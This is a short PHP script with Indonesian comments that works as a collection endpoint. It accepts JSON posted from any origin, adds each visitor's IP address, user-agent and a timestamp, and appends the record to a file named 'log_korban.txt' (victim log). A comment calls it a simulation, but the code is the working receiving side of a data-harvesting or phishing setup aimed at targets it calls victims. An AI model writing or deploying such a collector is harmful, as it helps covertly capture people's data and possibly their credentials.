<?php
// Izinkan akses dari mana saja (untuk simulasi)
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");

// Ambil data mentah JSON yang dikirim oleh JavaScript
$json_data = file_get_contents("php://input");
$data = json_decode($json_data, true);

if ($data) {
    // Tambahkan waktu saat data masuk
    $data['waktu_terekam'] = date("Y-m-d H:i:s");
    // Tambahkan IP Address asli pengunjung (dari sisi server)
    $data['ip_pengunjung'] = $_SERVER['REMOTE_ADDR'];
    // Tambahkan info Browser/User-Agent
    $data['user_agent'] = $_SERVER['HTTP_USER_AGENT'];

    // Ubah kembali ke format teks yang rapi
    $log_entry = json_encode($data, JSON_PRETTY_PRINT) . "\n----------------------------------------\n";

    // Simpan ke dalam file teks (append)
    file_put_contents("log_korban.txt", $log_entry, FILE_APPEND);

    // Beri respons sukses ke JavaScript
    echo json_encode(["status" => "success", "pesan" => "Data diterima"]);
} else {
    echo json_encode(["status" => "error", "pesan" => "Tidak ada data"]);
}
?>
